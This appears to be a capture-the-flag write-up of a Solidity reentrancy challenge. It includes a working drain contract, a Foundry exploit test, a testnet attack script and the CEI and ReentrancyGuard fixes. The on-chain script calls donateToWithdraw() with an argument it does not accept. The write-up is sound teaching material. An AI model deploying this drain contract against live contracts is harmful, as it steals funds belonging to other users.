## 🎯 Objective

Drain all ETH from the `Reentrance` contract.

---

## 📄 Contracts Overview

### Reentrance

The contract has 2 important components:

- `balances`: mapping that tracks each user's donated balance
- `donate()`: allows users to donate ETH and register their balance
- `balanceOf()`: returns the registered balance of a user
- `withdraw()`: allows users to withdraw their registered balance

```solidity
mapping(address => uint256) public balances;

function donate(address _to) public payable {
    balances[_to] = balances[_to] + msg.value;
}

function balanceOf(address _who) public view returns (uint256 balance) {
    return balances[_who];
}

function withdraw(uint256 _amount) public {
    if (balances[msg.sender] >= _amount) {
        (bool result,) = msg.sender.call{value: _amount}("");
        if (result) {
            _amount;
        }
        balances[msg.sender] -= _amount;  // ← state updated AFTER external call
    }
}
```

---

## 🧠 Vulnerability: Reentrancy

The core vulnerability is the **Checks-Effects-Interactions (CEI) pattern violation** in the `withdraw` function.

```solidity
function withdraw(uint256 _amount) public {
    if (balances[msg.sender] >= _amount) {
        (bool result,) = msg.sender.call{value: _amount}("");  // ← external call FIRST
        if (result) {
            _amount;
        }
        balances[msg.sender] -= _amount;  // ← state updated AFTER
    }
}
```

The contract sends ETH to `msg.sender` BEFORE updating `balances[msg.sender]`.

If `msg.sender` is a malicious contract with a `receive()` function, it can call `withdraw()` again BEFORE `balances[msg.sender]` is decremented — because the balance still shows the full amount.

This creates a recursive loop that drains the contract completely.

---

## Attack Flow

```
1. Attacker deploys AttackReentrance contract

2. Attacker calls donateToWithdraw{value: 0.0001 ether}()
   → Donates 0.0001 ETH to register a balance in Reentrance
   → Immediately calls withdraw(0.0001 ether)

3. Reentrance checks: balances[attacker] >= 0.0001 ETH ✅
   → Sends 0.0001 ETH to AttackReentrance
   → Triggers AttackReentrance.receive()

4. Inside receive():
   → Checks if Reentrance still has ETH
   → Calls withdraw() again BEFORE balances is updated
   → Reentrance checks: balances[attacker] >= amount ✅ (still not updated!)
   → Sends more ETH → triggers receive() again

5. Loop continues until:
   → Reentrance balance = 0
   → All ETH drained to AttackReentrance
```

---

## 📄 Attack Contract

```solidity
contract AttackReentrance {
    IReentrance public immutable ireentrance;
    uint256 public attackSize;

    constructor(address _ireentrance) {
        ireentrance = IReentrance(_ireentrance);
    }

    function donateToWithdraw() external payable {
        attackSize = msg.value;
        ireentrance.donate{value: msg.value}(address(this));
        ireentrance.withdraw(attackSize);
    }

    receive() external payable {
        uint256 targetBalance = address(ireentrance).balance;
        if (targetBalance > 0) {
            uint256 nextWithdrawal = targetBalance < attackSize 
                ? targetBalance 
                : attackSize;
            ireentrance.withdraw(nextWithdrawal);
        }
    }
}
```

**Key design decisions in the attack contract:**

- `attackSize` tracks the withdrawal amount dynamically
- `receive()` is the reentrant callback — automatically triggered every time Reentrance sends ETH
- `nextWithdrawal` uses `min(targetBalance, attackSize)` to avoid requesting more than the contract holds on the final loop — preventing a revert that would break the attack

---

## 🧪 Tests

|Test Name|What It Checks|
|---|---|
|`testBalanceOFUSERandContractUSingLowLevel`|Verifies that sending ETH directly to Reentrance updates the contract balance correctly|
|`testdonateAndBalanceOf`|Verifies `donate()` registers the correct balance for a user and `balanceOf()` returns it accurately|
|`testWithDraw`|Verifies legitimate withdraw reduces contract balance by the correct amount|
|`testExploitWithdraw`|Verifies the reentrancy attack fully drains the contract to 0 ETH|

### Key Exploit Test

```solidity
function testExploitWithdraw() public {
    // Fund the contract with victim ETH
    (bool s,) = address(ireentrace).call{value: 0.001 ether}("");
    require(s, "Failed to fund the contract");

    // Another user donates
    vm.startPrank(USER);
    vm.deal(USER, STARTING_BALANCE);
    ireentrace.donate{value: 0.005 ether}(USER);
    vm.stopPrank();

    // Attacker executes reentrancy attack
    vm.startPrank(spider);
    attack.donateToWithdraw{value: 0.0001 ether}();
    vm.stopPrank();

    // Contract fully drained
    assertEq(address(ireentrace).balance, 0);
}
```

The attacker donates only `0.0001 ETH` but drains the entire contract balance including funds belonging to other users.

---

## 🛡️ Fix

The fix is to follow the **Checks-Effects-Interactions (CEI) pattern** — update state BEFORE making external calls:

```solidity
// VULNERABLE (current):
function withdraw(uint256 _amount) public {
    if (balances[msg.sender] >= _amount) {
        (bool result,) = msg.sender.call{value: _amount}("");  // external call first
        balances[msg.sender] -= _amount;  // state update after
    }
}

// FIXED (CEI pattern):
function withdraw(uint256 _amount) public {
    if (balances[msg.sender] >= _amount) {
        balances[msg.sender] -= _amount;  // state update FIRST
        (bool result,) = msg.sender.call{value: _amount}("");  // external call after
    }
}
```

Alternative fix — use OpenZeppelin's `ReentrancyGuard`:

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Reentrance is ReentrancyGuard {
    function withdraw(uint256 _amount) public nonReentrant {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            balances[msg.sender] -= _amount;
        }
    }
}
```

---

## 🚀 On-Chain Script

```solidity
contract DeployReentranceScript is Script {
    address public target = YOUR_INSTANCE_ADDRESS;
    
    function run() external {
        vm.startBroadcast();
        AttackReentrance attack = new AttackReentrance(target);
        attack.donateToWithdraw{value: 0.001 ether}(target);
        console.log("Contract drained");
        vm.stopBroadcast();
    }
}
```

---

## 🛠️ How to Run

### Run Tests (Local Anvil)

```bash
forge test --mt testExploitWithdraw -vvvv
```

### Run All Tests

```bash
forge test -vvvv
```

### Deploy & Attack (On-chain)

```bash
forge script script/AttackReentranceScript.s.sol \
  --rpc-url $RPC_SEPOLIA_URL \
  --private-key $PRIVATE_KEY \
  --broadcast
```

---

## 📁 Project Structure

```
├── src/
│   └── Reentrance.sol
│   └── AttackReentrance.sol
├── script/
│   ├── DeployReentranceScript.s.sol
│   └── AttackReentranceScript.s.sol
└── test/
    └── TestReentrance.t.sol
```

---

## 📚 Key Takeaways

**Checks-Effects-Interactions (CEI) pattern:**

```
1. CHECKS   → validate all conditions first
2. EFFECTS  → update all state variables
3. INTERACTIONS → make external calls last
```

Any external call made BEFORE state is updated creates a reentrancy window. This vulnerability class has caused some of the largest DeFi exploits in history:

- The DAO hack (2016) — $60M drained via reentrancy
- Cream Finance (2021) — $130M flash loan reentrancy
- Reentrancy remains one of the top findings in competitive audits today

---

_Built by Pratik Das (spider256-pt) · Bhubaneswar, India · 2025_ _Specialisation: Formal Verification + Cross-Chain Bridge Security_
